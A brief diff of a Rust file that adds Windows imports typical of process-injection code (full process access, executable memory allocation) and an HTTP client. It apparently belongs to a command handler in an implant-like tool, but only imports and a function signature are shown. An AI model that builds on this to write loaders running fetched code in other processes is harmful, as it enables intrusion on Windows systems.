@@ -1,7 +1,9 @@
 use std::error::Error;
 #[cfg(windows)] extern crate winapi;
 #[cfg(windows)] extern crate kernel32;
-#[cfg(windows)]  use winapi::um::winnt::{PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
+#[cfg(windows)] use winapi::um::winnt::{PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
+#[cfg(windows)] use std::ptr;
+#[cfg(windows)] use reqwest::Client;
 
 pub async fn handle(s: &String) -> Result<String, Box<dyn Error>> {
     #[cfg(windows)] {
